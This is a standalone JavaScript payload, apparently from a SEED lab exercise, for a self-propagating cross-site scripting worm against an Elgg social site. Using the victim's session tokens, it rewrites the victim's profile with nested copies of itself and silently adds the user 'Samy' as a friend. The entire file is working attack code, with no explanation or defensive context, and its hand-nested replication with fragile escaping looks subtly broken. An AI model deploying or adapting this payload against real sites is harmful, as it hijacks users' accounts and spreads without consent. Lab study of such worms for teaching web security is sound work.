<script type="text/javascript">
window.onload = function() {
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 要更新的个人资料描述
    var content = userName + guid + ts + token + "&description= profile changed!<script type='text/javascript'>" + encodeURIComponent(
        '<script type="text/javascript">' +
        'window.onload = function() {' +
        '    var userName = "&name=" + elgg.session.user.name;' +
        '    var guid = "&guid=" + elgg.session.user.guid;' +
        '    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;' +
        '    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;' +
        '    var content = userName + guid + token + ts + "&description= profile changed!<script type=\'text/javascript\'>" + encodeURIComponent(' +
        '        \'<script type="text/javascript">' +
        '        window.onload = function() {' +
        '            var userName = "&name=" + elgg.session.user.name;' +
        '            var guid = "&guid=" + elgg.session.user.guid;' +
        '            var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;' +
        '            var token = "&__elgg_token=" + elgg.security.token.__elgg_token;' +
        '            var content = userName + guid + token + ts + "&description= profile changed!<script type=\'text/javascript\'>" + encodeURIComponent(' +
        '            \'<script type="text/javascript">' +
        '            window.onload = function() {' +
        '                var userName = "&name=" + elgg.session.user.name;' +
        '                var guid = "&guid=" + elgg.session.user.guid;' +
        '                var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;' +
        '                var token = "&__elgg_token=" + elgg.security.token.__elgg_token;' +
        '                var content = userName + guid + token + ts + "&description= profile changed!";' +
        '                var samyGuid = 59;' +
        '                var sendurl = "http://www.seed-server.com/action/profile/edit";' +
        '                if (elgg.session.user.guid != samyGuid) {' +
        '                    var Ajax = new XMLHttpRequest();' +
        '                    Ajax.open("POST", sendurl, true);' +
        '                    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");' +
        '                    Ajax.send(content);' +
        '                }' +
        '                var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;' +
        '                var Ajax2 = new XMLHttpRequest();' +
        '                Ajax2.open("GET", addFriendUrl, true);' +
        '                Ajax2.send();' +
        '            }' +
        '        </script>' +
        '    ) + "</script>";' +
        '    var samyGuid = 59;' +
        '    var sendurl = "http://www.seed-server.com/action/profile/edit";' +
        '    if (elgg.session.user.guid != samyGuid) {' +
        '        var Ajax = new XMLHttpRequest();' +
        '        Ajax.open("POST", sendurl, true);' +
        '        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");' +
        '        Ajax.send(content);' +
        '    }' +
        '}' +
        '</script>'
    ) + "</script>";

    // Samy 的 GUID
    var samyGuid = 59;

    // 请求的 URL
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    // 发送 POST 请求以修改个人资料
    if (elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        // 发送 GET 请求以添加 Samy 为好友
        var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;
        var Ajax2 = new XMLHttpRequest();
        Ajax2.open("GET", addFriendUrl, true);
        Ajax2.send();
    }
}
</script>
